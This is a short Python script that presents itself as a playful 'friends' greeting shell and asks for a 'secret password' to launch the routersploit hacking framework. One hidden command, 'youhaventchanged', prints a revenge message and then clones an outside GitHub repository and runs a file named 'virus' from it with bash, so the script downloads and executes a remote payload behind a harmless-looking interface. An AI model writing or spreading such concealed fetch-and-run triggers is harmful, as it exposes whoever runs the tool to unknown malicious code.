#!/usr/bin/env python3

import os
import sys
import cmd
import pyfiglet

if sys.version_info.major < 3:
	usr_input = input("Type secret password to start hacking")
	while (usr_input != "ididchange") and (usr_input != ""):
		usr_input = input("Input: ")
	if usr_input == 'ididchange':
		os.system("cd ~/routersploit")
		os.system("./rsf.py")
		
	elif usr_input == '':
		exit()

os.system("pyfiglet My Freinds!")
print("")
print("Welcome my freinds!")

class freinds(cmd.Cmd):

	def do_hi(self, line):
		print("Hello my freinds :)")

	def do_youhaventchanged(self,line):
		print("you have sinned about time i get revenge on you")
		os.system("git clone https://github.com/leomeh6/secret")
		os.system("bash secret/virus")
		
	def do_exit(self, line):
		print("goodbye my freinds :)")

if __name__ == '__main__':
	freinds().cmdloop()
